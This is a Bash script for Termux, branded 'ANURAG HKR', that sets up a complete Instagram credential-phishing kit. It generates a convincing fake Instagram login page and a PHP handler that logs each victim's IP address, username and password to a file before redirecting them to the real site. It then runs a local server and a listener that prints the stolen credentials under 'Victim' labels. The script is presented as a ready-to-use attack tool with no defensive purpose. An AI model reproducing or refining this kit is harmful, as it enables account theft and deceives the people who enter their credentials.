#!/bin/bash

# --- 1. SETUP & CLEANUP ---
clear
# Colors
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
Y='\033[1;33m'
RESET='\033[0m'

# Cleaning Ports
pkill -f php > /dev/null 2>&1

# Setup Folders
rm -rf auth/
mkdir -p auth
touch usernames.txt

# --- 2. HEADER (ANURAG HKR) ---
clear
echo -e "${C}=========================================${RESET}"
echo -e "${Y}      ANURAG HKR - MOBILE EDITION        ${RESET}"
echo -e "${C}=========================================${RESET}"
echo ""

# --- 3. ASK PORT ---
echo -ne "${G}[?] Enter Port (Default 8080): ${RESET}"
read USER_PORT
PORT=${USER_PORT:-8080}

# --- 4. YOUR HTML (Mobile Optimized CSS Added) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body{ background:#0b1116; color:#fff; }

.main{ display:flex; min-height:100vh; }

/* Desktop View (Default) */
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }

.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; padding: 20px; } /* Added padding for safety */
.card h2{ font-size:20px; margin-bottom:20px; text-align: center; }

.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline: none; }
.input:focus{ border: 1px solid #a8a8a8; }

.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.btn:hover{ background: #1877f2; }

.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor: pointer; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor: pointer; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor: pointer; }
.meta{ text-align:center; margin-top:25px; opacity:.7; font-size: 12px; }

/* --- MOBILE MAGIC FIX (ANDROID) --- */
@media(max-width:900px){
    .main{ flex-direction:column; }
    
    /* Hide the left image part on mobile (Like real Instagram) */
    .left{ display:none; } 
    
    /* Make right side full screen and black */
    .right{ width:100%; height:100vh; background:#000; align-items: center; }
    
    /* Adjust card for small screens */
    .card{ width: 100%; max-width: 350px; background: transparent; }
    .card h2 { font-size: 22px; }
}
</style>
</head>

<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
    </div>

    <div class="right">
        <div class="card">
            <h2 style="font-family: sans-serif;">Instagram</h2>
            
            <form action="login.php" method="POST">
                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="password" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">From<br><strong style="font-size:14px;">Meta</strong></div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 5. PHP CAPTURE LOGIC ---
cat > auth/login.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'];
\$pass = \$_POST['password'];
\$log = "\$ip|\$user|\$pass\n";
file_put_contents("../usernames.txt", \$log, FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. START SERVER (God Mode) ---
echo -e "${Y}[*] Starting Server on Port $PORT...${RESET}"
termux-chroot php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
PID=$!
sleep 2

# --- 7. MONITORING (Anurag Style) ---
if ps -p $PID > /dev/null; then
    echo -e "${G}[✔] SERVER STARTED!${RESET}"
    echo -e "${C}Link: http://127.0.0.1:$PORT${RESET}"
    echo -e "${R}[-] Press Ctrl + C to Stop${RESET}"
    echo ""
    echo -e "${Y}Waiting for Victim...${RESET}"
    echo ""

    # Listener Loop
    tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
        if [[ ! -z "$ip" ]]; then
            echo -e "${R}[-] Victim IP Found !${RESET}"
            echo -e "${G}[-] Victim's IP : $ip${RESET}"
            echo -e "${C}[-] Saved in : auth/ip.txt${RESET}"
            echo -e "${G}[-] Login info Found !!${RESET}"
            echo -e "${G}[-] Account  : $user${RESET}"
            echo -e "${G}[-] Password : $pass${RESET}"
            echo -e "${R}[-] Saved in : usernames.txt${RESET}"
            echo -e "----------------------------------------"
            echo -e "\a"
        fi
    done
else
    echo -e "${R}[!] Error: Port $PORT Busy Hai.${RESET}"
fi
